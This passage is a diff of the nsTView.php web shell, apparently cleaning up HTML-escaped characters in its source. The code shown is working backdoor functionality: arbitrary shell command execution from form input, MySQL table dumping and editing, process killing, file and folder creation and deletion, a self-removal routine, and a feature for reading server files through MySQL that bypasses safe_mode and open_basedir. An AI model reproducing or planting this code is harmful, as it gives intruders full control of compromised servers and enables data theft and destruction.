         $total_m_i .= "`".$matches4[1][$i]."`,";
         $total_m_x .= "'".$matches4[2][$i]."',";
@@ -586,9 +586,9 @@ $total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
 $total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);
 
 $make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
-mysql_query($make_insert) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$make_insert\";&lt;br&gt;&lt;br&gt;";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
+mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
+print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
 }#end of insert
 }#end of update
 }
@@ -597,26 +597,26 @@ print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$lo
 
 # insert new line
 if($_GET['ins_new_line']){
-$qn = mysql_query('SHOW FIELDS FROM '.$tbl) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."&ins_new_line=1'&gt;
-Insert new line in &lt;b&gt;$tbl&lt;/b&gt; table&lt;/b&gt;&lt;Br&gt;&lt;br&gt;";
-print "&lt;table&gt;";
+$qn = mysql_query('SHOW FIELDS FROM '.$tbl) or die("<font color=red>".mysql_error()."</font>");
+print "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."&ins_new_line=1'>
+Insert new line in <b>$tbl</b> table</b><Br><br>";
+print "<table>";
 while ($new_line = mysql_fetch_array($qn, MYSQL_ASSOC)) {
-foreach ($new_line as $key =&gt;$next) {
+foreach ($new_line as $key =>$next) {
 $buff .= "$next ";
 }
 $expl=explode(" ",$buff);
 $buff2 .= $expl[0]." ";
-print "&lt;tr&gt;&lt;td bgcolor=silver&gt;&lt;b&gt;$expl[0]&lt;/b&gt;&lt;br&gt;&lt;font color=green&gt;(&lt;b&gt;$expl[1]&lt;/b&gt;)&lt;/font&gt;&lt;/td&gt;
-&lt;td&gt;&lt;textarea name='$expl[0]' cols=39 rows=5&gt;&lt;/textarea&gt;
-&lt;/td&gt;&lt;/tr&gt;";
+print "<tr><td bgcolor=silver><b>$expl[0]</b><br><font color=green>(<b>$expl[1]</b>)</font></td>
+<td><textarea name='$expl[0]' cols=39 rows=5></textarea>
+</td></tr>";
 unset($buff);
 }
-print "&lt;/table&gt;
-&lt;center&gt;&lt;input type=submit value=Insert name=mk_ins&gt;&lt;/form&gt;&lt;/center&gt;";
+print "</table>
+<center><input type=submit value=Insert name=mk_ins></form></center>";
 if($_POST['mk_ins']){
 preg_match_all("/(.*?)\s/i",$buff2,$matches3);
-for($i=0; $i&lt;count($matches3[0]); $i++){
+for($i=0; $i<count($matches3[0]); $i++){
 eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
 $total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
 }
@@ -624,7 +624,7 @@ $total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
 $total_str = ",,".$total_str;
 preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);
 
-for($i=0; $i&lt;count($matches4[1]); $i++){
+for($i=0; $i<count($matches4[1]); $i++){
         $matches4[1][0]=str_replace(",","",$matches4[1][0]);
         $total_m_i .= "`".$matches4[1][$i]."`,";
         $total_m_x .= "'".$matches4[2][$i]."',";
@@ -633,9 +633,9 @@ $total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
 $total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);
 
 $make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
-mysql_query($make_insert) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$make_insert\";&lt;br&gt;&lt;br&gt;";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
+mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
+print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
 }#end of mk ins
 }#end of ins new line
 
@@ -646,18 +646,18 @@ print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$lo
 
 if(isset($_GET['rename_table'])){
 $rename_table=$_GET['rename_table'];
-print "&lt;br&gt;&lt;br&gt;Rename &lt;b&gt;$rename_table&lt;/b&gt; to&lt;br&gt;&lt;br&gt;
-&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$rename_table'&gt;
-&lt;input name=new_name size=30&gt;&lt;center&gt;&lt;br&gt;
-&lt;input type=submit value=Rename&gt;&lt;/center&gt;
-&lt;/form&gt;
+print "<br><br>Rename <b>$rename_table</b> to<br><br>
+<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$rename_table'>
+<input name=new_name size=30><center><br>
+<input type=submit value=Rename></center>
+</form>
 ";
 
 if(isset($_POST['new_name'])){
-mysql_select_db($db) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-mysql_query("RENAME TABLE $rename_table TO ".$_POST['new_name']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;br&gt;&lt;font color=green&gt;Table &lt;b&gt;$rename_table&lt;/b&gt; renamed to &lt;b&gt;".$_POST['new_name']."&lt;/b&gt;&lt;/font&gt;";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&db=$db\"&gt;";
+mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
+mysql_query("RENAME TABLE $rename_table TO ".$_POST['new_name']) or die("<font color=red>".mysql_error()."</font>");
+print "<br><font color=green>Table <b>$rename_table</b> renamed to <b>".$_POST['new_name']."</b></font>";
+print "<meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&db=$db\">";
 }
 
 }#end of rename
@@ -665,12 +665,12 @@ print "&lt;meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$lo
 
 # dump table
 if($_GET['dump']){
-if(!is_writable($f_d)){die("&lt;br&gt;&lt;br&gt;&lt;font color=red&gt;This folder $f_d isnt writable!&lt;br&gt;Cannot make dump.&lt;br&gt;&lt;br&gt;
-&lt;font color=green&gt;&lt;b&gt;You can change temp folder for dump file in your browser!&lt;br&gt;
-&lt;font color=red&gt;Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)&lt;/font&gt;&lt;br&gt;
-Then press enter&lt;/b&gt;&lt;/font&gt;
-&lt;/font&gt;");}
-mysql_select_db($db) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
+if(!is_writable($f_d)){die("<br><br><font color=red>This folder $f_d isnt writable!<br>Cannot make dump.<br><br>
+<font color=green><b>You can change temp folder for dump file in your browser!<br>
+<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>
+Then press enter</b></font>
+</font>");}
+mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
 $fp = fopen($f_d."/".$f,"w");
 fwrite($fp, "# nsTView.php v$ver
 # Web: http://nst.void.ru
@@ -682,24 +682,24 @@ fwrite($fp, "# nsTView.php v$ver
 # --- eof ---
 
 ");
-$que = mysql_query("SHOW CREATE TABLE `$tbl`") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
+$que = mysql_query("SHOW CREATE TABLE `$tbl`") or die("<font color=red>".mysql_error()."</font>");
 $row = mysql_fetch_row($que);
 fwrite($fp, "DROP TABLE IF EXISTS `$tbl`;\r\n");
 $row[1]=str_replace("\n","\r\n",$row[1]);
 fwrite($fp, $row[1].";\r\n\r\n");
 $que = mysql_query("SELECT * FROM `$tbl`");
-if(mysql_num_rows($que)&gt;0){
+if(mysql_num_rows($que)>0){
 while($row = mysql_fetch_assoc($que)){
 $keys = join("`, `", array_keys($row));
 $values = array_values($row);
-foreach($values as $k=&gt;$v) {$values[$k] = adds2($v);}
+foreach($values as $k=>$v) {$values[$k] = adds2($v);}
 $values = implode("', '", $values);
 $sql = "INSERT INTO `$tbl`(`$keys`) VALUES ('".$values."');\r\n";
 fwrite($fp, $sql);
 }
 }
 fclose($fp);
-print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\"&gt;";
+print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
 }#end of dump
 
 
@@ -708,15 +708,15 @@ print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$lo
 # db dump
 if($_GET['dump_db']){
 $c=mysql_num_rows(mysql_list_tables($db));
-if($c&gt;=1){
-print "&lt;br&gt;&lt;br&gt;&nbsp;&nbsp;&nbsp;Dump database &lt;b&gt;$db&lt;/b&gt;";
+if($c>=1){
+print "<br><br>&nbsp;&nbsp;&nbsp;Dump database <b>$db</b>";
 }else{
-print "&lt;br&gt;&lt;br&gt;&lt;font color=red&gt;Cannot dump database. No tables exists in &lt;b&gt;$db&lt;/b&gt; db.&lt;/font&gt;";
+print "<br><br><font color=red>Cannot dump database. No tables exists in <b>$db</b> db.</font>";
 die;
 }
 if(sizeof($tabs)==0){
 $res = mysql_query("SHOW TABLES FROM $db");
-if(mysql_num_rows($res)&gt;0){
+if(mysql_num_rows($res)>0){
 while($row=mysql_fetch_row($res)){
 $tabs[] .= $row[0];
 }
@@ -740,11 +740,11 @@ $row = mysql_fetch_row($res);
 $row[1]=str_replace("\n","\r\n",$row[1]);
 fwrite($fp, $row[1].";\r\n\r\n");
 $res = mysql_query("SELECT * FROM `$tab`");
-if(mysql_num_rows($res)&gt;0){
+if(mysql_num_rows($res)>0){
 while($row=mysql_fetch_assoc($res)){
 $keys = join("`, `", array_keys($row));
 $values = array_values($row);
-foreach($values as $k=&gt;$v) {$values[$k] = adds2($v);}
+foreach($values as $k=>$v) {$values[$k] = adds2($v);}
 $values = join("', '", $values);
 $sql = "INSERT INTO `$tab`(`$keys`) VALUES ('$values');\r\n";
 fwrite($fp, $sql);
@@ -752,7 +752,7 @@ fwrite($fp, $sql);
 fwrite($fp, "\r\n\r\n\r\n");
 }
 fclose($fp);
-print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\"&gt;";
+print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
 }#end of db dump
 
 
@@ -763,7 +763,7 @@ print "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$lo
 $vnutr=$_GET['vnutr'];
 $tbl=$_GET['tbl'];
 if($vnutr and !$_GET['ins_new_line']){
-print "&lt;table cellpadding=0 cellspacing=1&gt;&lt;tr&gt;&lt;td&gt;";
+print "<table cellpadding=0 cellspacing=1><tr><td>";
 
 mysql_select_db($db) or die(mysql_error());
 $c=mysql_query ("SELECT COUNT(*) FROM $tbl");
@@ -771,22 +771,22 @@ $cfa=mysql_fetch_array($c);
 mysql_free_result($c);
 print "
 Total: $cfa[0]
-&lt;form&gt;
-From: &lt;input name=from size=3 value=0&gt;
-To: &lt;input name=to size=3 value='$cfa[0]'&gt;
-&lt;input type=submit name=show value=Show&gt;
-&lt;input type=hidden name=vnutr value=1&gt;
-&lt;input type=hidden name=vn value='$vn'&gt;
-&lt;input type=hidden name=db value='$db'&gt;
-&lt;input type=hidden name=login value='$login'&gt;
-&lt;input type=hidden name=pass value='$pass'&gt;
-&lt;input type=hidden name=adress value='$adress'&gt;
-&lt;input type=hidden name=conn value=1&gt;
-&lt;input type=hidden name=baza value=1&gt;
-&lt;input type=hidden name=p value=sql&gt;
-&lt;input type=hidden name=tbl value='$tbl'&gt;
- [&lt;a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl'&gt;DOWNLOAD&lt;/a&gt;] [&lt;a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&ins_new_line=1'&gt;INSERT&lt;/a&gt;] [&lt;a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&dump=1&f_d=$d'&gt;DUMP&lt;/a&gt;]
-&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+<form>
+From: <input name=from size=3 value=0>
+To: <input name=to size=3 value='$cfa[0]'>
+<input type=submit name=show value=Show>
+<input type=hidden name=vnutr value=1>
+<input type=hidden name=vn value='$vn'>
+<input type=hidden name=db value='$db'>
+<input type=hidden name=login value='$login'>
+<input type=hidden name=pass value='$pass'>
+<input type=hidden name=adress value='$adress'>
+<input type=hidden name=conn value=1>
+<input type=hidden name=baza value=1>
+<input type=hidden name=p value=sql>
+<input type=hidden name=tbl value='$tbl'>
+ [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl'>DOWNLOAD</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&ins_new_line=1'>INSERT</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&dump=1&f_d=$d'>DUMP</a>]
+</form></td></tr></table>";
 $vn=$_GET['vn'];
 $from=$_GET['from'];
 $to=$_GET['to'];
@@ -798,33 +798,33 @@ $query = "SELECT * FROM $vn LIMIT $from,$to";
 $result = mysql_query($query);
 $result1= mysql_query($query);
 print $del_result;
-print "&lt;table cellpadding=0 cellspacing=1 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;";
-for ($i=0;$i&lt;mysql_num_fields($result);$i++){
+print "<table cellpadding=0 cellspacing=1 border=1><tr><td></td>";
+for ($i=0;$i<mysql_num_fields($result);$i++){
 $name=mysql_field_name($result,$i);
 $type  = mysql_field_type($result, $i);
 $len  = mysql_field_len($result, $i);
-print "&lt;td bgcolor=#BCE0FF&gt; $name (&lt;b&gt;$type($len)&lt;/b&gt;)&lt;/td&gt;";
+print "<td bgcolor=#BCE0FF> $name (<b>$type($len)</b>)</td>";
 }
-print "&lt;/tr&gt;&lt;pre&gt;";
+print "</tr><pre>";
 
 while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
-foreach($mn as $key=&gt;$inside){
+foreach($mn as $key=>$inside){
 $buffer1 .= "`$key`='".adds($inside)."' AND ";
-$b1 .= "&lt;td&gt;".htmlspecialchars($inside, ENT_NOQUOTES)."&nbsp;&lt;/td&gt;";
+$b1 .= "<td>".htmlspecialchars($inside, ENT_NOQUOTES)."&nbsp;</td>";
 }
 $buffer1  = substr($buffer1, 0, strlen($buffer1)-5);
 $buffer1  = base64_encode($buffer1);
-print "&lt;td&gt;
-&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'&gt;
-&lt;input type=hidden name=delete_row value='$buffer1'&gt;
-&lt;input type=submit value=Del onclick='return confirm(\"DELETE ?\")' style='border:1px; background-color:white;'&gt;
-&lt;/form&gt;&lt;form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'&gt;
-&lt;input type=hidden name=edit_row value='$buffer1'&gt;
-&lt;input type=submit value=Edit style='border:1px;background-color:green;'&gt;
-&lt;/form&gt;
-&lt;/td&gt;\r\n";
+print "<td>
+<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>
+<input type=hidden name=delete_row value='$buffer1'>
+<input type=submit value=Del onclick='return confirm(\"DELETE ?\")' style='border:1px; background-color:white;'>
+</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>
+<input type=hidden name=edit_row value='$buffer1'>
+<input type=submit value=Edit style='border:1px;background-color:green;'>
+</form>
+</td>\r\n";
 print $b1;
-print "&lt;/tr&gt;";
+print "</tr>";
 unset($b1);
 unset($buffer1);
 }
@@ -832,15 +832,15 @@ unset($buffer1);
 
 
 mysql_free_result($result);
-print "&lt;/table&gt;";
+print "</table>";
 } #end vnutr
-print "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+print "</td></tr></table>";
 } # end $conn
 
 
 
 ####   end of sql
-print "&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+print "</tr></td></table> </td></tr></table>";
 print $copyr;
 die;
 }
@@ -848,13 +848,13 @@ die;
 
 @$p=$_GET['p'];
 if(@$_GET['p']=="selfremover"){
-        print "&lt;tr&gt;&lt;td&gt;";
-print "&lt;font color=red face=verdana size=1&gt;Are you sure?&lt;br&gt;
-&lt;a href='$php_self?p=yes'&gt;Yes&lt;/a&gt; | &lt;a href='$php_self?'&gt;No&lt;/a&gt;&lt;br&gt;
-Remove: &lt;u&gt;";
+        print "<tr><td>";
+print "<font color=red face=verdana size=1>Are you sure?<br>
+<a href='$php_self?p=yes'>Yes</a> | <a href='$php_self?'>No</a><br>
+Remove: <u>";
 $path=__FILE__;
 print $path;
-print " &lt;/u&gt;?&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+print " </u>?</td></tr></table>";
 die;
 }
 
@@ -863,9 +863,9 @@ $path=__FILE__;
 @unlink($path);
 $path=str_replace("\\","/",$path);
 if(file_exists($path)){$hmm="NOT DELETED!!!";
-print "&lt;tr&gt;&lt;td&gt;&lt;font color=red&gt;FILE $path NOT DELETED&lt;/td&gt;&lt;/tr&gt;";
+print "<tr><td><font color=red>FILE $path NOT DELETED</td></tr>";
 }else{$hmm="DELETED";}
-print "&lt;script&gt;alert('$path $hmm');&lt;/script&gt;";
+print "<script>alert('$path $hmm');</script>";
 
 }
 
@@ -877,22 +877,22 @@ global $fast_commands;
 $c_f=explode("\n",$fast_commands);
 $c_f=count($c_f)-2;
 print "
-&lt;form method=post&gt;
-Total commands: $c_f&lt;br&gt;
-&lt;select name=sh3&gt;";
+<form method=post>
+Total commands: $c_f<br>
+<select name=sh3>";
 
 $c=substr_count($fast_commands," (nst) ");
-for($i=0; $i&lt;=$c; $i++){
+for($i=0; $i<=$c; $i++){
        $expl2=explode("\r\n",$fast_commands);
         $expl=explode(" (nst) ",$expl2[$i]);
         if(trim($expl[1])!=""){
-        print "&lt;option value='".trim($expl[1])."'&gt;$expl[0]&lt;/option&gt;\r\n";
+        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
    }
 }
 
-print "&lt;/select&gt;&lt;br&gt;
-&lt;input type=submit value=Exec&gt;
-&lt;/form&gt;
+print "</select><br>
+<input type=submit value=Exec>
+</form>
 ";
 }
 }#end of os unix
@@ -904,71 +904,71 @@ global $fast_commands_win;
 $c_f=explode("\n",$fast_commands_win);
 $c_f=count($c_f)-2;
 print "
-&lt;form method=post&gt;
-Total commands: $c_f&lt;br&gt;
-&lt;select name=sh3&gt;";
+<form method=post>
+Total commands: $c_f<br>
+<select name=sh3>";
 
 $c=substr_count($fast_commands_win," (nst) ");
-for($i=0; $i&lt;=$c; $i++){
+for($i=0; $i<=$c; $i++){
        $expl2=explode("\r\n",$fast_commands_win);
         $expl=explode(" (nst) ",$expl2[$i]);
         if(trim($expl[1])!=""){
-        print "&lt;option value='".trim($expl[1])."'&gt;$expl[0]&lt;/option&gt;\r\n";
+        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
    }
 }
 
-print "&lt;/select&gt;&lt;br&gt;
-&lt;input type=submit value=Exec&gt;
-&lt;/form&gt;
+print "</select><br>
+<input type=submit value=Exec>
+</form>
 ";
 }
 }#end of os win
 
 
 echo "
-&lt;tr&gt;&lt;td&gt;";
-if(@$_GET['sh311']=="1"){echo "&lt;center&gt;cmd&lt;br&gt;pwd:
+<tr><td>";
+if(@$_GET['sh311']=="1"){echo "<center>cmd<br>pwd:
 ";
 chdir($d);
-echo getcwd()."&lt;br&gt;&lt;br&gt;
-Fast cmd:&lt;br&gt;";
+echo getcwd()."<br><br>
+Fast cmd:<br>";
 fastcmd();
 if($os=="win"){$d=str_replace("/","\\\\",$d);}
 print "
-&lt;a href=\"javascript:cwd('$d ')\"&gt;Insert pwd&lt;/a&gt;
-&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;
+<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
+<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>
 ";
 if(@$_POST['sh3']){
 $sh3=$_POST['sh3'];
-echo "&lt;pre&gt;";
+echo "<pre>";
 print `$sh3`;
-echo "&lt;/pre&gt;";
+echo "</pre>";
 }
 }
 
 if(@$_GET['sh311']=="2"){
-echo "&lt;center&gt;cmd&lt;br&gt;
+echo "<center>cmd<br>
 pwd:
 ";
 chdir($d);
-echo getcwd()."&lt;br&gt;&lt;br&gt;
-Fast cmd:&lt;br&gt;";
+echo getcwd()."<br><br>
+Fast cmd:<br>";
 fastcmd();
 if($os=="win"){$d=str_replace("/","\\\\",$d);}
 print "
-&lt;a href=\"javascript:cwd('$d ')\"&gt;Insert pwd&lt;/a&gt;
-&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;";
+<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
+<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>";
 if(@$_POST['sh3']){
 $sh3=$_POST['sh3'];
-echo "&lt;pre&gt;"; print `$sh3`; echo "&lt;/pre&gt;";}
+echo "<pre>"; print `$sh3`; echo "</pre>";}
 echo $copyr;
 exit;}
 
 if(@$_GET['delfl']){
 @$delfolder=$_GET['delfolder'];
-echo "DELETE FOLDER: &lt;font color=red&gt;".@$_GET['delfolder']."&lt;/font&gt;&lt;br&gt;
-(All files must be writable)&lt;br&gt;
-&lt;a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'&gt;Yes&lt;/a&gt; || &lt;a href='$php_self?d=$d'&gt;No&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+echo "DELETE FOLDER: <font color=red>".@$_GET['delfolder']."</font><br>
+(All files must be writable)<br>
+<a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'>Yes</a> || <a href='$php_self?d=$d'>No</a><br><br>
 ";
 echo $copyr;
 exit;
@@ -977,15 +977,15 @@ exit;
 
 $mkdir=$_GET['mkdir'];
 if($mkdir){
-print "&lt;br&gt;&lt;b&gt;Create Folder in $d :&lt;/b&gt;&lt;br&gt;&lt;br&gt;
-&lt;form method=post&gt;
-New folder name:&lt;br&gt;
-&lt;input name=dir_n size=30&gt;
-&lt;/form&gt;&lt;br&gt;
+print "<br><b>Create Folder in $d :</b><br><br>
+<form method=post>
+New folder name:<br>
+<input name=dir_n size=30>
+</form><br>
 ";
 if($_POST['dir_n']){
 mkdir($d."/".$_POST['dir_n']) or die('Cannot create directory '.$_POST['dir_n']);
-print "&lt;b&gt;&lt;font color=green&gt;Directory created success!&lt;/font&gt;&lt;/b&gt;";
+print "<b><font color=green>Directory created success!</font></b>";
 }
 print $copyr;
 die;
@@ -994,17 +994,17 @@ die;
 
 $mkfile=$_GET['mkfile'];
 if($mkfile){
-print "&lt;br&gt;&lt;b&gt;Create file in $d :&lt;/b&gt;&lt;br&gt;&lt;br&gt;
-&lt;form method=post&gt;
-File name:&lt;br&gt;
-(example: hello.txt , hello.php)&lt;br&gt;
-&lt;input name=file_n size=30&gt;
-&lt;/form&gt;&lt;br&gt;
+print "<br><b>Create file in $d :</b><br><br>
+<form method=post>
+File name:<br>
+(example: hello.txt , hello.php)<br>
+<input name=file_n size=30>
+</form><br>
 ";
 if($_POST['file_n']){
 $fp=fopen($d."/".$_POST['file_n'],"w") or die('Cannot create file '.$_POST['file_n']);
 fwrite($fp,"");
-print "&lt;b&gt;&lt;font color=green&gt;File created success!&lt;/font&gt;&lt;/b&gt;";
+print "<b><font color=green>File created success!</font></b>";
 }
 print $copyr;
 die;
@@ -1024,15 +1024,15 @@ $str=`ps aux`;
 preg_match_all("/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i",$str,$matches);
 
 
-print "&lt;br&gt;&lt;b&gt;PS Table :: Fast kill program&lt;br&gt;
-(p.s: Tested on Linux slackware 10.0)&lt;br&gt;
-&lt;br&gt;&lt;/b&gt;";
-print "&lt;center&gt;&lt;table border=1&gt;";
-for($i=0; $i&lt;count($matches[3]); $i++){
+print "<br><b>PS Table :: Fast kill program<br>
+(p.s: Tested on Linux slackware 10.0)<br>
+<br></b>";
+print "<center><table border=1>";
+for($i=0; $i<count($matches[3]); $i++){
 $expl=explode(" ",$matches[0][$i]);
-print "&lt;tr&gt;&lt;td&gt;$expl[0]&lt;/td&gt;&lt;td&gt;PID: ".$matches[1][$i]." :: ".$matches[3][$i]."&lt;/td&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;Kill: &lt;input type=submit name=kill_p value=".trim($matches[1][$i])."&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;";
+print "<tr><td>$expl[0]</td><td>PID: ".$matches[1][$i]." :: ".$matches[3][$i]."</td><form method=post><td><font color=red>Kill: <input type=submit name=kill_p value=".trim($matches[1][$i])."></td></form></tr>";
 }#end of for
-print "&lt;/table&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;";
+print "</table></center><br><br>";
 unset($str);
 print $copyr;
 die;
@@ -1044,36 +1044,36 @@ if($read_file_safe_mode){
 
 if(!isset($_POST['l'])){$_POST['l']="root";}
 
-print "&lt;br&gt;
-Read file content using MySQL - when &lt;b&gt;safe_mode&lt;/b&gt;, &lt;b&gt;open_basedir&lt;/b&gt; is &lt;font color=green&gt;ON&lt;/font&gt;&lt;Br&gt;
-&lt;form method=post&gt;
-&lt;table&gt;
-&lt;tr&gt;&lt;td&gt;Addr:&lt;/td&gt;&lt;Td&gt; &lt;input name=serv_ip value='127.0.0.1'&gt;&lt;input name=port value='3306' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input name=l value=".$_POST['l']."&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;Passw:&lt;/td&gt;&lt;td&gt;&lt;input name=p value=".$_POST['p']."&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-(example: /etc/hosts)&lt;br&gt;
-&lt;input name=read_file size=45&gt;&lt;br&gt;
-&lt;input type=submit value='Show content'&gt;
-&lt;/form&gt;
-&lt;br&gt;";
+print "<br>
+Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>
+<form method=post>
+<table>
+<tr><td>Addr:</td><Td> <input name=serv_ip value='127.0.0.1'><input name=port value='3306' size=6></td></tr>
+<tr><td>Login:</td><td><input name=l value=".$_POST['l']."></td></tr>
+<tr><td>Passw:</td><td><input name=p value=".$_POST['p']."></td></tr></table>
+(example: /etc/hosts)<br>
+<input name=read_file size=45><br>
+<input type=submit value='Show content'>
+</form>
+<br>";
 
 if($_POST['read_file']){
 $read_file=$_POST['read_file'];
-@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
